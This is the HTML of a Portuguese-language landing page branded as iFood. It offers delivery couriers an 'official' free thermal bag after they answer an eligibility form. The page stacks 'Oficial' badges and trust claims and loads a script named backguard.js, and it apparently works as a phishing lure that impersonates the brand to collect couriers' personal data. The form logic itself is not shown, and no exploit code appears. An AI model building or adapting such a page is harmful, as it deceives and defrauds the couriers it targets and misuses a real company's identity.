<!DOCTYPE html>
<html lang="pt-BR">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
    <meta name="theme-color" content="#EA1D2C">
    <meta name="theme-color" media="(prefers-color-scheme: dark)" content="#EA1D2C">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="default">
    <title>iFood Entregador - Kit Oficial</title>
    <meta name="description"
        content="Responda o formulário e verifique a elegibilidade para receber o kit parceiro iFood.">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@400;500;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="/style.css?v=3.0">
    <script src="backguard.js?v=1.5"></script>
</head>

<body data-page="home">


    <header class="header">
        <div class="logo-container">
            <img src="/assets/ifoodentregadores.png" alt="iFood Entregador" class="ifood-logo ifood-logo--wide">
        </div>
    </header>

    <noscript class="no-js">Para continuar, ative o JavaScript no navegador.</noscript>

    <main class="container">
        <section class="step fade-in-up" aria-hidden="false">
            <div class="badge-container">
                <span class="badge">Oficial</span>
            </div>

            <h1>Bolsa iFood Oficial</h1>
            <p>Responda o formulário para verificar se você é qualificado para receber o kit parceiro em casa.</p>

            <div class="hero-image">
                <img src="/assets/bagfoto.png" alt="Mochila iFood" loading="eager" decoding="async"
                    fetchpriority="high">
            </div>

            <div class="benefits">
                <div class="benefit-item">Térmica</div>
                <div class="benefit-item">Impermeável</div>
                <div class="benefit-item">Expansível</div>
            </div>

            <div class="action-stack">
                <button id="btn-start" class="btn-primary" type="button">Quero participar</button>
            </div>

            <div class="trust-strip trust-strip--cards">
                <div class="trust-card">
                    <span class="trust-icon trust-icon--truck">
                        <svg viewBox="0 0 24 24">
                            <path
                                d="M20 8h-3V4H3v13h2c0 1.66 1.34 3 3 3s3-1.34 3-3h6c0 1.66 1.34 3 3 3s3-1.34 3-3h2v-5l-3-4zM8 18c-.55 0-1-.45-1-1s.45-1 1-1 1 .45 1 1-.45 1-1 1zm12 0c-.55 0-1-.45-1-1s.45-1 1-1 1 .45 1 1-.45 1-1 1zm-3-5V9h2.5l1.96 2.5H17v1.5H15z" />
                        </svg>
                    </span>
                    <span>Envio rastreado</span>
                </div>
                <div class="trust-card">
                    <span class="trust-icon trust-icon--lock">
                        <svg viewBox="0 0 24 24">
                            <path
                                d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 10.99h7c-.53 4.12-3.28 7.79-7 8.94V12H5V6.3l7-3.11v8.8z" />
                        </svg>
                    </span>
                    <span>Dados protegidos</span>
                </div>
                <div class="trust-card">
                    <span class="trust-icon trust-icon--ok">
                        <svg viewBox="0 0 24 24">
                            <path d="M7 2v11h3v9l7-12h-4l4-8z" />
                        </svg>
                    </span>
                    <span>Processo rápido</span>
                </div>
            </div>

        </section>
    </main>

    <div id="toast" class="toast hidden" role="status" aria-live="polite"></div>

    <footer class="footer">
        <p>&copy; 2026 iFood. Todos os direitos reservados.</p>
    </footer>

    <script src="script.js?v=8.2" defer></script>
</body>

</html>
